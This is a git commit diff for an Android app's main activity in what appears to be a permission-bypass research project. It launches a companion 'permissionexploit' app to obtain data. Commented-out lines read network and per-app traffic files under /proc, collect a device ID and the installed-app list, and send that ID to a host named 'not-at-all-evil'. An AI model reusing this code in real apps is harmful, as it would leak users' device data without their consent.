9e0c582a7ab67a0f6e81a4c20034562c66b6ded4
th4m <ph.th4m@gmail.com>
2016-05-10 18:42:52 +0200

    Shit works

--- app/src/main/java/se/evinja/lbs/lbsapp/MainActivity.java
+++ app/src/main/java/se/evinja/lbs/lbsapp/MainActivity.java
@@ -6,27 +6,32 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
+import android.view.View;
+import android.widget.TextView;
+import android.widget.Toast;
 
 public class MainActivity extends AppCompatActivity {
+
+    private int REQUEST_CODE = 600;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        LinuxKernel lk = new LinuxKernel();
+//        LinuxKernel lk = new LinuxKernel();
 //        lk.runCommand("cat /proc/net/arp");
 //        lk.runCommand("cat /proc/net/wireless");
-        lk.runCommand("cat -l /proc/uid_stat/10055/tcp_rcv");
+//        lk.runCommand("cat -l /proc/uid_stat/10055/tcp_rcv");
 
-        String uid = new UniqueID().getID(getApplicationContext());
-        Log.i("GOT ID", uid);
-
-        new InstalledApps().getInstalledApps(getApplicationContext());
-
+//        String uid = new UniqueID().getID(getApplicationContext());
+//        Log.i("GOT ID", uid);
+//
+//        new InstalledApps().getInstalledApps(getApplicationContext());
+//
         Intent i =  new Intent(Intent.ACTION_SEND);
         i.setComponent(new ComponentName("se.evinja.lbs.permissionexploit", "se.evinja.lbs.permissionexploit.MainActivity"));
-        startActivity(i);
+        startActivityForResult(i, REQUEST_CODE);
 
 //        new ExploitContactsPermission().startExploit(getApplicationContext());
 
@@ -34,5 +39,19 @@ public class MainActivity extends AppCompatActivity {
 //        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://not-at-all-evil.evinja.se?id=" + uid));
 //        startActivity(intent);
 
+    }
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode,
+                                    Intent data) {
+        if (requestCode == REQUEST_CODE) {
+            if (resultCode == RESULT_OK) {
+                String string = data.getStringExtra("RESULT_STRING");
+//                Toast.makeText(this, string, Toast.LENGTH_SHORT).show();
+                TextView tv = (TextView)findViewById(R.id.textString);
+                if (string != null && tv != null) {
+                    tv.setText(string);
+                }
+            }
+        }
     }
 }
